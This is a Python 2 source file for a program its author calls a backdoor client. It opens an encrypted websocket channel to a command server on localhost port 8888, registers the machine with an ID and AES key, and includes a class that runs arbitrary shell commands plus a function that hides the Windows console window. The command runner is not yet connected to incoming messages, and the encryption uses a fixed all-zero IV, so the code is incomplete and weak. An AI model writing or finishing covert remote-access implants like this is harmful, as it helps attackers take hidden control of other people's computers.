#!/usr/bin/env python
# coding:utf-8
import os
import ctypes
import subprocess
import threading
import chardet
import uuid
import json
import time
from base64 import b64decode, b64encode
from websocket import create_connection
from Crypto.Cipher import AES
__author__ = 'nekocode'


class BackdoorClient(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.SERVER_HOST = 'http://127.0.0.1:8888'
        self.ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None

        self.daemon = True
        self.start()

    def run(self):
        while True:
            try:
                self.ws = create_connection("ws://localhost:8888/")

                sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET)}
                self.ws.send(json.dumps(sercret_msg))

                time.sleep(1)

                while True:
                    msg = json.loads(self.ws.recv())
                    if 'data' in msg:
                        data = self.decrypt(msg['data'])
                        print data

                self.ws.close()

            except Exception as e:
                if self.ws:
                    self.ws.close()
                time.sleep(3)

    def send_msg(self, data):
        msg = {'data': self.encrypt(data)}
        self.ws.send(json.dumps(msg))

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain


class ExecCmd(threading.Thread):
    def __init__(self, command):
        threading.Thread.__init__(self)
        self.command = command

        self.daemon = True
        self.start()

    def run(self):
        try:
            proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read()
            stdout_value += proc.stderr.read()

        except Exception as e:
            pass


class ShowDialog(threading.Thread):
    def __init__(self, content, title=''):
        threading.Thread.__init__(self)
        self.content = content.decode(chardet.detect(content)['encoding'])
        self.title = title.decode(chardet.detect(title)['encoding'])

        self.daemon = True
        self.start()

    def run(self):
        ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)


def hide_cmd_window():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)

if __name__ == '__main__':
    BackdoorClient()
    while True:
        time.sleep(10)



